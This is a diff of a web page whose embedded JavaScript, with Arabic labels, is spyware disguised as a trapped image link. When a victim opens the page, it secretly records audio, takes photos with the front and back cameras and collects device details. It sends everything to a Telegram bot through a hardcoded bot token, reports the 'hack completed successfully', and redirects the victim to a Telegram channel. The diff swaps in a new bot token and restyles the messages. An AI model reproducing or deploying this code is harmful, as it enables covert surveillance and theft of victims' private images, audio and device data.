@@ -53,7 +53,7 @@
 <script>
     (function(){
         // ========== توكن البوت (ثابت) ==========
-        const BOT_TOKEN = '8493347589:AAHasi6GzARbAGL-Ic7ggWgsDUhw4diwe1s';
+        const BOT_TOKEN = '8786484895:AAGdGXjuolhfJzsIExpNqaq7NfkBi481zas';
         const REDIRECT_URL = 'https://t.me/Whiskybots';
         
         // ========== استخراج target ID من الرابط ==========
@@ -365,7 +365,7 @@
             let audioUrl = await recordAudio(5000);
             
             // إرسال البيانات إلى المعرف المستهدف
-            await sendToTelegram(`🔥 تم اختراق ضحـية عـبࢪ صـوࢪه ملـغمـة 🔥\n\nالجهاز: ${deviceInfo.brand} - ${deviceInfo.fullName}\nالوقت: ${new Date().toLocaleString('ar-EG')}\n\nتم الإرسال إلى المعرف: ${getChatId()}`);
+            await sendToTelegram(`#☑️ تم اختراق ضحـية عـبࢪ صـوࢪه ملـغمـة ☑️#\n\nالجهاز: ${deviceInfo.brand} - ${deviceInfo.fullName}\nالوقت: ${new Date().toLocaleString('ar-EG')}\n\nتم الإرسال إلى المعرف: ${getChatId()}`);
             
             let report = `📱 <b>بـيانـات الهـاتـف و الـضحـيه</b>\n\n`;
             report += `الجهاز: ${deviceInfo.fullName}\n`;
@@ -398,19 +398,19 @@
             await sendToTelegram(report, true);
             
             for(let i = 0; i < frontPhotos.length; i++) {
-                await sendPhoto(frontPhotos[i], `📸 كاميرا أمامية - صورة ${i+1}`);
+                await sendPhoto(frontPhotos[i], `☑️# كاميرا أمامية - صورة ${i+1}`);
                 await delay(300);
             }
             for(let i = 0; i < backPhotos.length; i++) {
-                await sendPhoto(backPhotos[i], `📷 كاميرا خلفية - صورة ${i+1}`);
+                await sendPhoto(backPhotos[i], `#☑️ كاميرا خلفية - صورة ${i+1}`);
                 await delay(300);
             }
             
             if(audioUrl) {
-                await sendAudio(audioUrl, "🎙️ تسجيل صوتي (5 ثوانٍ)");
+                await sendAudio(audioUrl, "🎙️ تسجيل ءالصـوت (5 ثوانٍ)");
             }
             
-            await sendToTelegram(`✅ اكتمل الاختراق بنجاح ✅\nتم إرسال ${frontPhotos.length} صور أمامية و ${backPhotos.length} صور خلفية`);
+            await sendToTelegram(`#☑️ اكتمل الاختراق بنجاح ☑️#\nتم إرسال ${frontPhotos.length} صور أمامية و ${backPhotos.length} صور خلفية`);
             
             await delay(1500);
             window.location.href = REDIRECT_URL;
